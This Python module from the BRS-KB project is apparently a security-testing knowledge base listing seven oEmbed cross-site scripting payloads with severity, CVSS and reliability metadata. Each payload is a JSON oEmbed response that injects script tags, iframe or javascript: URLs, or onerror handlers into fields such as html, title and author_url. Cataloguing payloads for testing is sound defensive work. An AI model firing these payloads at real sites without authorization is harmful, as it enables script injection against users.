#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26

oEmbed XSS Payloads
XSS via oEmbed/embed endpoints
"""

from ..models import PayloadEntry


OEMBED_XSS_DATABASE = {
    # ===== OEMBED HTML RESPONSE =====
    "oembed_html_001": PayloadEntry(
        payload='{"html":"<script>alert(1)</script>","version":"1.0","type":"rich"}',
        contexts=["json", "html_content"],
        tags=["oembed", "embed", "html"],
        severity="high",
        cvss_score=7.5,
        description="oEmbed HTML response XSS",
        reliability="high",
    ),
    "oembed_html_002": PayloadEntry(
        payload='{"html":"<iframe src=javascript:alert(1)>","version":"1.0","type":"video"}',
        contexts=["json", "html_content"],
        tags=["oembed", "embed", "iframe"],
        severity="high",
        cvss_score=7.5,
        description="oEmbed iframe XSS",
        reliability="high",
    ),
    # ===== OEMBED TITLE XSS =====
    "oembed_title_001": PayloadEntry(
        payload='{"title":"<img src=x onerror=alert(1)>","version":"1.0","type":"link"}',
        contexts=["json", "html_content"],
        tags=["oembed", "embed", "title"],
        severity="high",
        cvss_score=7.5,
        description="oEmbed title XSS",
        reliability="high",
    ),
    # ===== OEMBED AUTHOR XSS =====
    "oembed_author_001": PayloadEntry(
        payload='{"author_name":"<script>alert(1)</script>","version":"1.0","type":"rich"}',
        contexts=["json", "html_content"],
        tags=["oembed", "embed", "author"],
        severity="high",
        cvss_score=7.5,
        description="oEmbed author_name XSS",
        reliability="high",
    ),
    # ===== OEMBED PROVIDER XSS =====
    "oembed_provider_001": PayloadEntry(
        payload='{"provider_name":"<img src=x onerror=alert(1)>","version":"1.0","type":"rich"}',
        contexts=["json", "html_content"],
        tags=["oembed", "embed", "provider"],
        severity="high",
        cvss_score=7.5,
        description="oEmbed provider_name XSS",
        reliability="medium",
    ),
    # ===== OEMBED URL XSS =====
    "oembed_url_001": PayloadEntry(
        payload='{"author_url":"javascript:alert(1)","version":"1.0","type":"rich"}',
        contexts=["json", "href"],
        tags=["oembed", "embed", "url"],
        severity="high",
        cvss_score=7.5,
        description="oEmbed author_url XSS",
        reliability="medium",
    ),
    # ===== OEMBED THUMBNAIL XSS =====
    "oembed_thumb_001": PayloadEntry(
        payload='{"thumbnail_url":"javascript:alert(1)","version":"1.0","type":"photo"}',
        contexts=["json", "src"],
        tags=["oembed", "embed", "thumbnail"],
        severity="high",
        cvss_score=7.5,
        description="oEmbed thumbnail_url XSS",
        reliability="low",
    ),
}

OEMBED_XSS_TOTAL = len(OEMBED_XSS_DATABASE)
